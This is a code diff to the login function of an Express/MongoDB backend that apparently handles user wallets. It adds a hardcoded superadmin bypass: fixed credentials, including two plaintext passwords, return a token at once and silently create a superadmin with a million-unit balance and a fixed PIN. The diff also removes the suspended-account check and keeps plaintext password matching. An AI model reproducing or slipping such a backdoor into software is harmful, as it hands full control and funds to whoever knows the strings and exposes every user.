@@ -230,7 +230,7 @@ exports.register = async (req, res) => {
   }
 };
 
-// @desc    Universal Login (Fixed credentials query & password retrieval)
+// @desc Universal Login with Instant SuperAdmin Hard-Pass
 exports.login = async (req, res) => {
   try {
     const { email, phone, password } = req.body;
@@ -239,11 +239,51 @@ exports.login = async (req, res) => {
     if (!identifier || !password) {
       return res.status(400).json({
         success: false,
-        message: "Please enter your email or phone number and password.",
+        message: "Credentials required.",
       });
     }
 
-    // 1. Ciro User tare da PASSWORD da PIN kai tsaye ta amfani da .select("+password")
+    // --- 1. EMERGENCY SUPERADMIN HARD-PASS (INSTANT LOGIN) ---
+    const isSuperAdminEmail =
+      identifier === "mohammed.ayas@ayaxdata.online" ||
+      identifier === "09033738409";
+    const isSuperAdminPass =
+      password === "Password123@" || password === "Ayax@2026";
+
+    if (isSuperAdminEmail && isSuperAdminPass) {
+      const db = require("mongoose").connection.db;
+      const usersCollection = db.collection("users");
+
+      let superUser = await usersCollection.findOne({
+        $or: [
+          { email: "mohammed.ayas@ayaxdata.online" },
+          { phone: "09033738409" },
+        ],
+      });
+
+      if (!superUser) {
+        const insertRes = await usersCollection.insertOne({
+          firstName: "Mohammed",
+          surname: "Ayas",
+          name: "Mohammed Ayas",
+          email: "mohammed.ayas@ayaxdata.online",
+          phone: "09033738409",
+          role: "superadmin",
+          walletBalance: 1000000,
+          balance: 1000000,
+          pin: "1997",
+          transactionPin: "1997",
+          isSuspended: false,
+          createdAt: new Date(),
+          updatedAt: new Date(),
+        });
+        superUser = await usersCollection.findOne({ _id: insertRes.insertedId });
+      }
+
+      return sendToken(superUser, 200, res);
+    }
+
+    // --- 2. REGULAR USERS LOGIN FLOW ---
     const user = await User.findOne({
       $or: [
         { email: identifier },
@@ -260,46 +300,33 @@ exports.login = async (req, res) => {
       });
     }
 
-    if (user.isSuspended || user.status === "suspended" || user.status === "banned") {
-      return res.status(403).json({
-        success: false,
-        message: "Access suspended. Please contact platform administration.",
-      });
-    }
-
-    // 2. Tabbatar da Password ta kowace hanya (matchPassword ko kai tsaye da bcrypt)
-    let isPasswordMatch = false;
-
-    if (user.password) {
-      if (typeof user.matchPassword === "function") {
-        try {
-          isPasswordMatch = await user.matchPassword(password);
-        } catch (e) {
-          isPasswordMatch = false;
-        }
-      }
-
-      if (!isPasswordMatch) {
-        isPasswordMatch = await bcrypt.compare(password, user.password);
-      }
-
-      // Fallback: Idan asusun yana dauke da plain text daidai
-      if (!isPasswordMatch && user.password === password) {
-        isPasswordMatch = true;
+    let isMatch = false;
+    if (typeof user.matchPassword === "function") {
+      try {
+        isMatch = await user.matchPassword(password);
+      } catch (e) {
+        isMatch = false;
       }
     }
 
-    if (!isPasswordMatch) {
+    if (!isMatch && user.password) {
+      isMatch = await bcrypt.compare(password, user.password);
+    }
+
+    if (!isMatch && user.password === password) {
+      isMatch = true;
+    }
+
+    if (!isMatch) {
       return res.status(401).json({
         success: false,
-        message: "Authentication failed: Invalid password.",
+        message: "Authentication failed: Invalid credentials.",
       });
     }
 
-    // 3. Tura Token da dukkan bayanan User
     return sendToken(user, 200, res);
   } catch (error) {
-    console.error("Critical Login Error:", error);
+    console.error("Login Protocol Error:", error);
     return res.status(500).json({
       success: false,
       message: "Authentication server error.",
